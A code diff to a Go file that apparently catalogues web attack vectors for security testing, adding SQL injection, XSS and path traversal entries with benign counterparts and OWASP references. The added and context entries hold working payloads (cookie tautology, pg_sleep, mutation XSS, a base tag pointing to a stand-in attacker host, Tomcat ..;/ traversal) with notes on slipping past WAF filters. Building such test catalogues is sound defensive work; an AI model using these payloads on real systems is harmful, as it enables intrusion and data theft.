@@ -46,6 +46,14 @@ func sqlInjectionDepthVectors() ([]AttackVector, error) {
 	const src = "manually authored from CWE-89 / OWASP WSTG-INPV-05"
 	const wstg = "WSTG-INPV-05"
 	return buildDepth(FamilySQLInjection, "CWE-89", []depthSpec{
+		{id: "SQLI-011", name: "Boolean-based blind SQL injection in a tracking cookie", severity: SeverityHigh,
+			preconditions: "target reads a tracking cookie into a SQL query on the dashboard route and returns different pages for true and false conditions",
+			method:        "GET", path: "/dashboard", location: "header:Cookie", payload: "1' AND '1'='1", attack: "boolean tautology in a cookie value, an input location many WAF rule sets inspect less often than query strings",
+			benignPayload: "1", benignDescription: "ordinary tracking identifier", wstg: "WSTG-INPV-05", top10: top10Injection, source: "manually authored from CWE-89 / OWASP WSTG-INPV-05", platform: PlatformAny},
+		{id: "SQLI-012", name: "PostgreSQL pg_sleep injection in a sort parameter", severity: SeverityHigh,
+			preconditions: "target builds an ORDER BY clause from a sort parameter on a PostgreSQL-backed list endpoint",
+			method:        "GET", path: "/list", location: "query:sort", payload: "(SELECT 1 FROM PG_SLEEP(5))", attack: "time-based injection in the ORDER BY position, where parameterised placeholders are not available and filters often miss it",
+			benignPayload: "name", benignDescription: "ordinary sort column", wstg: "WSTG-INPV-05", top10: top10Injection, source: "manually authored from CWE-89 / OWASP WSTG-INPV-05", platform: PlatformAny},
 		{id: "SQLI-004", name: "Time-based blind SQL injection (MySQL SLEEP) in a product ID", severity: SeverityHigh,
 			preconditions: "target exposes a product-detail endpoint keyed by an ID, backed by MySQL, with no visible error or content difference",
 			method:        "GET", path: "/products", location: "query:id", payload: "1' AND SLEEP(5)-- -", attack: "time-based blind injection that makes the database pause five seconds when the condition is true",
@@ -79,6 +87,14 @@ func sqlInjectionDepthVectors() ([]AttackVector, error) {
 
 func xssDepthVectors() ([]AttackVector, error) {
 	return buildDepth(FamilyXSS, "CWE-79", []depthSpec{
+		{id: "XSS-013", name: "Mutation XSS through a noscript element in rich text", severity: SeverityHigh,
+			preconditions: "target sanitises rich-text comments with a parser whose output is re-parsed by the browser, and the sanitiser keeps noscript",
+			method:        "POST", path: "/comment", location: "body:json:body", payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", attack: "markup that the sanitiser sees as an attribute but the browser re-parses as an image tag after the noscript element closes",
+			benignPayload: "Great article, thanks for sharing.", benignDescription: "ordinary comment text", wstg: "WSTG-INPV-01", top10: top10Injection, source: "manually authored from CWE-79 / OWASP WSTG-INPV-01", platform: PlatformAny},
+		{id: "XSS-014", name: "Base-tag injection that redirects relative script loads", severity: SeverityMedium,
+			preconditions: "target reflects a profile name into the head of the page without restricting HTML",
+			method:        "GET", path: "/profile", location: "query:name", payload: "<base href=\"//attacker-lab.test/\">", attack: "injected base element that changes where every relative script and link on the page is loaded from",
+			benignPayload: "Alice", benignDescription: "ordinary display name", wstg: "WSTG-INPV-01", top10: top10Injection, source: "manually authored from CWE-79 / OWASP WSTG-INPV-01", platform: PlatformAny},
 		{id: "XSS-007", name: "Polyglot XSS payload that breaks out of several HTML contexts", severity: SeverityHigh,
 			preconditions: "target reflects a parameter into a page where the surrounding context (text, attribute, style or script) is not known",
 			method:        "GET", path: "/search", location: "query:q", payload: `'"--></style></script><svg onload=alert(1)>`, attack: "one string that closes quotes, comments, style and script elements and then opens an event handler",
@@ -112,6 +128,12 @@ func pathTraversalDepthVectors() ([]AttackVector, error) {
 	const pre = "target exposes a file-download endpoint that builds a filesystem path from a user-supplied filename"
 	benign := "invoice-2026-09.pdf"
 	return buildDepth(FamilyPathTraversal, "CWE-22", []depthSpec{
+		{id: "PATHTRAV-009", name: "Unix traversal to a host-identity file through a filename parameter", severity: SeverityMedium, preconditions: pre + ", running on a Unix-like host",
+			method: "GET", path: "/download", location: "query:file", payload: "../../../../etc/hostname", attack: "a read of a harmless host-name file, proving traversal out of the download directory on Unix",
+			benignPayload: benign, benignDescription: "ordinary filename within the intended download directory", wstg: wstg, top10: top10Access, source: src, platform: PlatformUnix},
+		{id: "PATHTRAV-010", name: "Tomcat path-parameter traversal (..;/) on a static route", severity: SeverityMedium, preconditions: "target is a Java servlet container whose static-asset route strips path parameters after the WAF inspects them",
+			method: "GET", path: "/static/file", location: "query:file", payload: "..;/..;/WEB-INF/web.xml", attack: "semicolon path-parameter that the servlet container ignores when resolving the path, so the traversal escapes the static directory",
+			benignPayload: "css/site.css", benignDescription: "ordinary static stylesheet path", wstg: wstg, top10: top10Access, source: src, platform: PlatformAny},
 		{id: "PATHTRAV-003", name: "Windows backslash traversal reading win.ini", severity: SeverityHigh, preconditions: pre + ", on a Windows host",
 			method: "GET", path: "/download", location: "query:file", payload: `..\..\..\..\windows\win.ini`, attack: "backslash traversal to a world-readable Windows configuration file, for filters that only look for forward slashes",
 			benignPayload: benign, benignDescription: "ordinary filename within the intended download directory", wstg: wstg, top10: top10Access, source: src},
